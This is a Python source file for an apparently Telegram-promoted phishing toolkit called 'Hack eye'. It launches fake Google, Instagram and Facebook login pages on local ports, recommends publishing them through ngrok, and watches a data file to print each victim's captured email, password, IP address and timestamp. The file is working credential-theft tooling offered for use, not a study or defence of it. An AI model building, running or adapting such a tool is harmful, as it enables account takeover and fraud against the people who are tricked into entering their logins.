import os
import time
import json
import subprocess
from termcolor import colored

def welcome_message():
    eye_art = colored('''

.__                   __                                       
|  |__ _____    ____ |  | __ ___________    ____ ___.__. ____  
|  |  \\__  \ _/ ___\|  |/ // __ \_  __ \ _/ __ <   |  |/ __ \ 
|   Y  \/ __ \\  \___|    <\  ___/|  | \/ \  ___/\___  \  ___/      by *ablaze
|___|  (____  /\___  >__|_ \\___  >__|     \___  > ____|\___  >
     \/     \/     \/     \/    \/             \/\/         \/ 
     
    ''', 'cyan', attrs=['bold'])
    
    print(eye_art)
    print(colored("Welcome to Hack eye\n", 'cyan', attrs=['bold']))
    print(colored("Join our TG channel for updates:\n @pythonnews_uzbekistan\n", 'cyan', attrs=['bold']))

def install_libs():
    print(colored("[+] Installing required libraries...", 'cyan', attrs=['bold']))
    os.system('pip install -r requirements.txt > /dev/null 2>&1')
    print(colored("[✔] Libraries installed successfully.", 'green', attrs=['bold']))

def show_menu():
    print(colored("[ 01 ] - Google Phishing (Port: 5001)", 'cyan', attrs=['bold']))
    print(colored("[ 02 ] - Instagram Phishing (Port: 5002)", 'cyan', attrs=['bold']))
    print(colored("[ 03 ] - Facebook Phishing (Port: 5003)", 'cyan', attrs=['bold']))

def recommend_ngrok(port):
    print(colored(f"[✔] Your service is running on port {port}.", 'green', attrs=['bold']))
    print(colored(f"Had better use ngrok to expose it securely online.", 'yellow', attrs=['bold']))
    print(colored(f"To do that, run: ngrok http {port}", 'cyan', attrs=['bold']))

def handle_choice(choice):
    if choice == '1':
        port = 5001
        print(colored("[+] Starting Google Phishing page on Port 5001...", 'cyan', attrs=['bold']))
        subprocess.Popen(["python", "google.py", str(port)], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
        recommend_ngrok(port)

    elif choice == '2':
        port = 5002
        print(colored("[+] Starting Instagram Phishing page on Port 5002...", 'cyan', attrs=['bold']))
        subprocess.Popen(["python", "instagram.py", str(port)], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
        recommend_ngrok(port)

    elif choice == '3':
        port = 5003
        print(colored("[+] Starting Facebook Phishing page on Port 5003...", 'cyan', attrs=['bold']))
        subprocess.Popen(["python", "facebook.py", str(port)], stdout=open(os.devnull, 'w'), stderr=subprocess.STDOUT)
        recommend_ngrok(port)

    else:
        print(colored("[x] Invalid choice!", 'red', 'on_white'))

def watch_json():
    print(colored("[*] Monitoring 'data.json' for new logins...", 'yellow', attrs=['bold']))
    
    try:
        with open('data.json', 'r') as file:
            data = json.load(file)
        
        while True:
            with open('data.json', 'r') as file:
                new_data = json.load(file)
            
            if new_data != data:
                new_entry = new_data[-1]
                print(colored("\n[+] New login detected:", 'yellow', attrs=['bold']))
                print(colored(f"Email: {new_entry['email']}", 'yellow', attrs=['bold']))
                print(colored(f"Password: {new_entry['password']}", 'yellow', attrs=['bold']))
                print(colored(f"IP: {new_entry['ip']}", 'yellow', attrs=['bold']))
                print(colored(f"Timestamp: {new_entry['timestamp']}", 'yellow', attrs=['bold']))
                data = new_data

            time.sleep(1)

    except Exception as e:
        print(colored("[x] Error occurred while monitoring the file.", 'red', 'on_white'))
        with open('logs.log', 'a') as log_file:
            log_file.write(f"{time.ctime()} - Error: {str(e)}\n")

def main():
    welcome_message()
    install_libs()

    while True:
        show_menu()
        try:
            choice = input(colored("┌─[Your Choice]: ", 'cyan', attrs=['bold']) + "\n└──> ")
            handle_choice(choice)
            watch_json()

        except KeyboardInterrupt:
            print(colored("\n[✔] Stopped by user.", 'red', 'on_white'))
            break

if __name__ == "__main__":
    main()
